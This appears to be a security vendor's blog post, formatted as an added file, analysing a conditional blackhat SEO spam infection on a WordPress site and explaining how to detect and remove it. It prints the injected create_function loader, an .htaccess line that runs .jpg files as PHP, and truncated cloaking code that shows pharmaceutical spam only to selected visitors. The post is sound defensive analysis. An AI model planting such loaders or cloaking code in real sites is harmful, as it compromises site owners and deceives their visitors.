@@ -1,0 +1,184 @@
+SiteCheck – Got Blackhat SEO Spam Warning?
+
+As of late it seems like we’re talking about a lot of SPAM related cases, this post will be no different.
+Before you start, let me preface this by saying that clearing a Blackhat SEO Spam injection is probably the biggest PITA (Google It) infection there is. They constantly evolve, making them difficult to detect and they employ both new and old techniques that, even after years, still prove to be annoying. This post will demonstrate one such case.
+
+Some of you reading this post have undoubtedly found yourself staring at this screen on SiteCheck and have probably found yourself cursing us or screaming False Positive:
+
+So let’s take this as an opportunity to better understand what might be going on. More importantly why you’re not finding it.
+Clearing the Issue
+
+Does this sound familiar?
+I swear, I have crawled our entire server!!! It’s just not there, your scanner is wrong!!! Please update it NOW!!! Why don’t you try doing something right for once!!!!!!!
+Oh my!! Yes, an every day realization that we have come to live with.
+And at first glance you might agree, but as in most cases all things are not always so clear superficially. So you can certainly empathize with this knee jerk reaction, fortunately we’re going to help provide some context and what to do.
+In case you’re one that can’t deal with the suspense, it comes down to conditional malware. For those that can, let’s dive into the detection component.
+Detection
+The key in these instances is to trigger the infection. You might go to the site and might not see anything and that’s to be expected. You want to use a tool that allows you to update your referrer.
+For those familiar with CLI the first thing to try is the Googlebot, using something like this:
+# curl -L -A “Googlebot/2.1 (+http://www.google.com/bot.html)” http://someinfectedwebsite.com
+Quick tip, you could always use the pipe or | option to grep elements found in the scanner. Here is how it might look:
+# curl -L -A “Googlebot/2.1 (+http://www.google.com/bot.html)” http://someinfectedwebsite.com | grep “http://lagrandeobserver.com”
+Unfortunately, in this instance, you would not have seen anything as the target wasn’t Googlebot. Makes sense as the intent is to stay live and impact readers, not be detected and be removed.
+Here is another tip, man I’m going to get fired, we see a lot of targeted attacks looking for Internet Explorer 6. The why is simple, its just too easy to compromise those users and if they’re using IE6, they’re likely running other vulnerable components that can be further compromised, but that’s a post in it of itself.
+So this is what we tried:
+# curl –user-agent “Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)” http://someinfectedwebsite.com | grep “http://lagrandeobserver.com”
+Lookie here folks, what do we have:
+
+Dang, I guess it wasn’t a false positive.. : / .. But the question remains, why can’t I find it when I crawl my files?
+If you tried looking for the domain, that’s probably where you approached things wrong. In this instance you want to find something that will give you the least amount of results and that will likely give you some response. If you searched for the domain you likely wouldn’t get any results. To help you out, here is something you would likely focus on <div id=”column-wrap”>.
+Fortunately the number of the results are manageable, in this case only 5. After looking at the files, and with a basic understanding of code, you see something peculiar with this particular snippet:
+# <div id=”column-wrap”><?php $wp__theme_icon=@create_function(”,@file_get_contents(‘/public_html/wp-content/themes/my-really-good-theme/images/s.jpg’));$wp__theme_icon(); ?>
+To help narrow it down you know that it has to be on a file that is generating a display on the client, so anything in header.php, footer.php or index.php is always a good place to start.
+At first glance you might think, “Oh, well they’re just pulling in an image from their theme.. ” Nothing suspicious, right? Not the case, couple of things to ask yourself:
+
+Is it referencing the active theme?
+Is it a theme you installed?
+Should there be a reference to this theme directory?
+Why would you reference your theme icon this way?
+
+You don’t even need to be a malware engineer or analyst to ask and answer those questions, and not being able to answer those should be concerning and worth further investigation.
+The other thing you might find yourself thinking is, “Oh, but it’s just a JPG file.. no problem, right?”
+No. In fact, by using something like this in your .htaccess you can change it so that your server treats .JPG files as a PHP file allowing you to execute anything that might be embedded:
+AddHandler php-script .jpg
+That’s exactly what happened here. One easy way to check in terminal is like this:
+[user@server /public_html/wp-content]# file ./themes/my-really-good-theme/images/s.jpg
+./themes/my-really-good-theme/images/s.jpg: ASCII text, with very long lines, with no line terminators
+An ASCII Text file disguised as a JPEG? Now that’s not right folks, that definitely deserves a closer inspection. Low and behold, this is what we find:
+$RXQKUlF=”142x61x73x6566x34x5fx64x65x63x6fx64145″;$qj85KE=”3YlJXYl
+R2X1Zmb0NWau9″;$LEF02VFT=”x2fx28x2e51x285651″;$PA12yPOb=”160x………
+………………….many many more lines of stuff
+To remove it you want to do the following:
+
+Remove the @create_function snippet
+Remove the JPG
+Remove the .htaccess snippet if it exists, it could be in PHP as well
+
+If that’s all you really cared about, then its good to stop here. That should give you all the info to check yourself before you wreck yourself. For those interested to learn what the obfuscated code was doing, read on.
+Understanding the Infection
+
+Now, let’s check this little piece of malicious code! So, here is a snippet of the code:
+$RXQKUlF=”142x61x73x6566x34x5fx64x65x63x6fx64145″;$qj85KE=”3YlJXYl
+R2X1Zmb0NWau9″;$LEF02VFT=”x2fx28x2e51x285651″;$PA12yPOb=”160x………
+This is what turns up after running some tools to turn the obfuscated code into something readable. Partially at least as there are various levels of obfuscation in the file.
+The first thing we noticed is the revision number. Not because its malicious, but because its amusing. How good of the malicious hacker to use version control, I can’t help but wonder if they have unit-testing, SVN, code review and all the other elements you’d expect in the traditional Software Development Lifecycle (SDLC). It warms my heart to see them mature.
+The code was pretty simple, it checked if your were a bot based on user agent or IP address:
+function __lambda_func(){
+// $Rev: 1391 $
+if(!function_exists(‘__php___memory_exists’)){
+function __php___memory_exists(){
+$masks = array(
+array(-655417344,-655409153),array(1089052672,1089060863),
+array(1123631104,1123639295),array(1208926208,1208942591),
+array(-782925824,-782893057),array(-1379794944,-1379729409),
+array(1249705984,1249771519),array(-655417344,-655409153),
+array(1078218752,1078220799),array(1113980928,1113985023),
+……………….many more
+array(1164938656,1164938663), //g
+array(1093926912,1094189055), //m
+……………….more
+); $is_bot = false;
+$your_mask=ip2long($_SERVER[“REMOTE_ADDR”]);
+$ua = strtolower($_SERVER[‘HTTP_USER_AGENT’]);
+if (false !== strpos($ua, ‘google’) || ………….
+‘gsa-crawler’) || false !== strpos($ua, ‘slurp’) || false !==
+strpos($ua, ‘yahoo’) || ……….
+return true;
+$botIps = Array(
+/* 2009-12-12 */ ‘66.249.[6-9][0-9].[0-9]+’,
+‘74.125.[0-9]+.[0-9]+’, ’38.[0-9]+.[0-9]+.[0-9]+’, ‘70.91.180.25’,
+‘65.93.62.242’, ‘74.193.246.129’, ‘213.144.15.38’, ‘195.92.229.2’,
+……………………..many more
+);
+foreach ($botIps as $p){
+if (preg_match(“/^{$p}/”, $_SERVER[“REMOTE_A………
+return true;
+}
+}
+foreach ($masks as $mask)
+if($your_mask>=$mask[0] and $your_mas………..
+return true;
+return false;
+}
+If the conditions are met, then it loads a GZIP compressed file named menu-riight.gif This file contains the spam code. Then it formats the uncompressed content that was divided in blocks.
+function __php___memory_test() {
+if (!__php___memory_exists())
+return -1;
+$php__test_file = ‘./menu-riight.gif’;
+$data = @file_get_contents($php__test_file); // PHP >= 4.3.0
+$data = @gzuncompress($data);
+//$pattern = ‘||’;/…..
+$startPos = 0;
+$blocks = Array();
+$label = ”;
+while (false !== ($pos = strpos($data, ‘<block_d6e4ce93cf082de43c……….
+if ($startPos) {
+$blocks[] = substr($data, $startPos, $pos – $startPos);
+}
+$startPos = $pos + strlen(‘<block_d6e4ce93cf082de43cd713fd8e6…………..
+//$label = substr($data, $pos + strlen(‘<block_d6e4ce93cf0…………….
+}
+if ($startPos) {
+$blocks[] = substr($data, $startPos);
+}
+foreach ($blocks as $b) {
+echo __php_memory_diagnostics($b);
+}
+}
+function __php_memory_diagnostics($data) {
+$marker = ‘==d6e4ce93cf082de43cd713……………..
+$len1 = strlen($marker);
+$len2 = $len1 + 1;
+$pos1 = strpos($data, $marker);
+$pos2 = $pos1 + $len1;
+if (false === $pos1 || fals……………………
+return -1;
+$pos3 = strpos($data, ‘==’, $pos2);
+if (false === $pos3)
+return -1;
+……………….
+……………….
+……………….
+and many more
+}
+function __php___make_seed($str, $co………………
+$seed = “”;
+$tseed = 0;
+for($i = 0; $i < strlen($str); ++$i)
+$seed .= ord($str[$i]);
+for($i = 0; $i < strlen($se……………………
+$tseed += $seed[$i];
+return $tseed;
+}
+function __php___shuffle_by_seed($ar, $srand_seed=null){
+if($srand_seed == null)
+$srand_seed = __php___make_seed($_SER……………….
+$ar_tmp = array();
+$i=0;
+while($i < count($ar)) {
+srand($srand_seed);
+$r = rand(1,count($ar));
+if (isset($ar_tmp[$r-1]))
+++$srand_seed;
+else {
+$ar_tmp[$r-1] = $ar[$i];
+++$i;
+}
+}
+ksort($ar_tmp);
+return $ar_tmp;
+}
+__php___memory_test();
+}
+}
+The other interesting part was the name it chose for the code functions: memory_test, memory_exists. These were not randomly chosen, it’s a way of making it appear seemingly benign and necessary to the untrained eye, increasing the odds of it not being removed even after reversing the obfuscation.
+Finally, in case you’re wondering, here is the what the final SPAM output looks like to the visitor that meets the appropriate conditions:
+<block_d6e4ce93cf082de43cd713fd8e62103b id=”dor1 “>==d6………..
+……t-il tout √† <a href=”http://www.lgrandeobserver.com/data-center/jos/index.php?data=685″>
+vardenafil costo</a> perdre avec mes notes. Il fallait que tout le jour de
+la <a href=”http://www.lagrandeobserver.com/data-center/jos/index.php?data=1368″>levitra 10 mg precio</a>
+Harpe.
+……………..
+calmer la foule silencieuse des toits d’une capitale comme <a href=”http://www.lagrandeobserver.com/da
+tenter/jos/index.php?data=123”>prezzo priligy</a> des crachats.
+These types of attacks are ongoing, and ever changing. If you or one of your customers has been hit by Blackhat SEO, and you need a hand, feel free to email us.
